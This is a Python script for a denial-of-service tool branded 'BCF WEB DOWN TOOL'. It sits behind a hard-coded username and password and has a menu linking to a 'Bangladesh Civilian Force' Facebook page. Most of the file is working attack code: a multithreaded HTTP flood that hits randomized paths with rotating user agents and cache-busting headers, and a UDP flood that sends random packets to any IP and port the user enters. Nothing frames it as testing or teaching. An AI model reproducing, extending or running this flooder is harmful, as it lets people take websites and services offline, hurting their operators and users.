import os, time, threading, requests, random, socket
from colorama import Fore, Style, init
from pyfiglet import figlet_format
init(autoreset=True)

def login():
    os.system("clear")
    print(Fore.CYAN + "Login to BCF WEB TOOL")
    user = input("Username: ")
    passwd = input("Password: ")
    if user == "BCF" and passwd == "BCF2019":
        print(Fore.GREEN + "\nLogin successful!")
        time.sleep(1)
        menu()
    else:
        print(Fore.RED + "Wrong credentials!")
        time.sleep(1)
        login()

def banner():
    os.system("clear")
    print(Fore.RED + Style.BRIGHT + """
███████  ██████  ███████      ██     ██ ███████ ██████  
██      ██      ██    ██     ██     ██ ██      ██   ██ 
███████ ██      ███████     ██  █  ██ █████   ██████  
      ██ ██      ██          ██ ███ ██ ██      ██   ██ 
███████  ██████ ██           ███ ███  ███████ ██   ██ 
    """)
    print(Fore.YELLOW + Style.BRIGHT + "               BCF WEB DOWN TOOL")

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2)",
    "Mozilla/5.0 (Android 11; Mobile)"
]

def http_flood(target_url, threads, duration):
    end_time = time.time() + duration
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2)",
        "Mozilla/5.0 (Android 11; Mobile)"
    ]
    def attack():
        while time.time() < end_time:
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Cache-Control": "no-cache",
                    "Accept-Encoding": "*",
                    "Connection": "keep-alive",
                    "Keep-Alive": "timeout=10, max=1000"
                }
                random_path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=5))
                full_url = target_url + random_path
                r = requests.get(full_url, headers=headers, timeout=5)
                print(Fore.GREEN + f"[HTTP {r.status_code}] => {full_url}")
            except Exception as e:
                print(Fore.RED + f"[HTTP FAIL] => {str(e)}")

    print(Fore.YELLOW + "[*] Starting HTTP Flood...")
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    time.sleep(duration)
    print(Fore.GREEN + "[✓] HTTP Flood finished.")


def udp_flood(target, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            client.sendto(bytes_data, (target, port))
            print(Fore.MAGENTA + f"[UDP] Sent packet to {target}:{port}")
        except:
            print(Fore.RED + f"[UDP FAIL] Packet to {target}:{port}")

def web_down():
    os.system("clear")
    print(Style.BRIGHT + Fore.RED + figlet_format("BCF WEB DOWN", font="slant"))
    print(Fore.YELLOW + "Launching HTTP Flood...")
    target = input(Fore.CYAN + "Target URL (include https://): ").strip()
    threads = int(input(Fore.CYAN + "Number of Threads: "))
    duration = int(input(Fore.CYAN + "Attack Duration (seconds): "))
    http_flood(target, threads, duration)


def udp_menu():
    ip = input(Fore.CYAN + "Target IP Address: ")
    port = int(input("Port: "))
    duration = int(input("Duration in seconds: "))
    print(Fore.YELLOW + "Launching UDP Flood...")
    threading.Thread(target=udp_flood, args=(ip, port, duration), daemon=True).start()
    time.sleep(duration)
    print(Fore.GREEN + "UDP Flood finished.")

def menu():
    while True:
        banner()
        print(Fore.CYAN + """
1. WEB DOWN (HTTP Flood)
2. UDP FLOOD
3. FACEBOOK PAGE
4. EXIT
""")
        choice = input(Fore.YELLOW + "Select Option: ")
        if choice == "1":
            web_down()
        elif choice == "2":
            udp_menu()
        elif choice == "3":
            print(Fore.BLUE + "Opening Facebook page...")
            os.system("xdg-open https://www.facebook.com/BangladeshCivilianForce369")
        elif choice == "4":
            print(Fore.GREEN + "Thanks for using BCF Tool!")
            break
        else:
            print(Fore.RED + "Invalid option!")

# Start the tool
login()
